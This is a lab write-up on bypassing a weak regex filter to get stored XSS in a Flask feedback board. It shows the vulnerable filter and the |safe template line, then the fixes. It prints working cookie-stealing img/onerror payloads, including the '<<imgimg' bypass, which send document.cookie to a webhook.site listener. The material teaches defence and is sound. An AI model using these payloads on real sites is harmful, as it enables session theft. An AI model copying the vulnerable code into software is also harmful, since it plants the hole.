Stored XSS With a Weak Filter

This lab uses a feedback board that tries to strip dangerous HTML before saving comments. The filter looks useful at first glance, but it is easy to bypass because the application still renders comment content as trusted HTML.

Quick XSS Reminder

Reflected XSS happens when attacker-controlled input is immediately reflected in the response. The victim usually needs to click a crafted link or submit a crafted request.

Stored XSS happens when attacker-controlled input is saved first, then rendered later to other users. This lab is stored XSS because comments stay in the database and execute when the admin opens the board.

Where the vulnerability comes from

The problem is not just the filter. The filter is weak, then the output is rendered with |safe. That means any payload that survives filtering is treated as real HTML.

def weak_tag_filter(content):
    return re.sub(
        r'<(script|img|svg|iframe|body|video|details)',
        '',
        content,
        flags=re.IGNORECASE,
    )

@app.route('/board', methods=['GET', 'POST'])
def board():
    if request.method == 'POST':
        content = weak_tag_filter(request.form['content'])
        conn.execute(
            "INSERT INTO comments (username, content, created_at) VALUES (?, ?, ?)",
            (user['username'], content, datetime.now().strftime('%Y-%m-%d %H:%M'))
        )
<div>{{ c.content | safe }}</div>

How the bypass works

A normal payload like the one below gets damaged by the filter, so it does not create a valid HTML element:

Normal payload

<img src=x onerror=fetch('https://webhook.site/your-id?c='+document.cookie)>

After filter

src=x onerror=fetch('https://webhook.site/your-id?c='+document.cookie)>

The bypass works by injecting an extra opening angle bracket and repeating the tag name. The regex removes the second <img and leaves the first < behind, which rebuilds a valid tag.

Bypass payload

<<imgimg src=x onerror=fetch('https://webhook.site/your-id?c='+document.cookie)>

After filter

<img src=x onerror=fetch('https://webhook.site/your-id?c='+document.cookie)>

When the admin visits the board, the browser renders that stored comment as an image element, the image load fails, and onerror sends the cookie to your webhook listener.

Fix

The direct fix is to stop trusting user HTML. In this lab, you can fix it in Python before storage, or in the template when rendering.

Fix in Python

Filter the submitted content on the server before saving it. A simple example is to remove special characters that are used to build HTML tags.

import re

def safe_filter(value):
    return re.sub(r'[<>"'"'"'()]', '', value)

if request.method == 'POST':
    content = safe_filter(request.form['content'])
    conn.execute(
        "INSERT INTO comments (username, content, created_at) VALUES (?, ?, ?)",
        (user['username'], content, datetime.now().strftime('%Y-%m-%d %H:%M'))
    )

Fix in Jinja / HTML rendering

Do not render user content with |safe. Let Jinja escape it by default.

<!-- vulnerable -->
<div>{{ c.content | safe }}</div>

<!-- fixed -->
<div>{{ c.content }}</div>

Using both together is better: the Python filter reduces dangerous input before storage, and removing |safe stops the browser from treating comments as trusted HTML.
